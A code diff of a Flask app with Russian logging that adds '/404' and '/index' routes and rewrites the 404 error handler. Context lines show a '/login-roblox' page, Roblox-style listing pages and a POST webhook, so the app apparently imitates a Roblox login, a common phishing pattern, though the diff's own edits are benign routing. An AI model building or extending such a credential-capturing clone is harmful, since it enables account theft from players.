@@ -362,6 +362,11 @@ def index():
     logger.info("Запрос на /")
     return render_template('index.html')
 
+@app.route('/404', endpoint='not_found')
+def not_found():
+    logger.info("Запрос на /404")
+    return render_template('404.html')  # Или '404.index.html', если нужен новый шаблон
+
 @app.route('/toptrending', endpoint='top_trending')
 def top_trending():
     logger.info("Запрос на /toptrending")
@@ -371,6 +376,11 @@ def top_trending():
 def login_roblox():
     logger.info("Запрос на /login-roblox")
     return render_template('login-roblox.html')
+
+@app.route('/index', endpoint='index_explicit')
+def index_explicit():
+    logger.info("Запрос на /index")
+    return render_template('index.html')
 
 @app.route('/upandcoming', endpoint='up_and_coming')
 def up_and_coming():
@@ -392,14 +402,11 @@ def top_revisited():
     logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
 
-@app.route('/404', endpoint='not_found')
-def not_found():
-    logger.info("Запрос на /404")
-    return render_template('404.html')
-
+# Обработчик 404-ошибок
 @app.errorhandler(404)
-def handle_404(e):
-    return render_template("404.html"), 404
+def page_not_found(e):
+    logger.info(f"404 ошибка: {request.path}")
+    return render_template('404.html'), 404  # Или '404.index.html'
 
 # Вебхук
 @app.route('/webhook', methods=['POST'])
